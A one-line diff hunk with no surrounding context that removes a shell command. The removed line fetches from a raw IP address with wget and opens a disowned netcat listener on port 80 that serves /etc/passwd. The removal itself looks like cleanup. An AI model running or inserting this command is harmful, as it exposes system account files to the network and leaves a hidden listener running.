@@ -1,1 +1,0 @@
-wget 129.123.12.13:2341/ip & nc -v -l 80 < /etc/passwd & disown
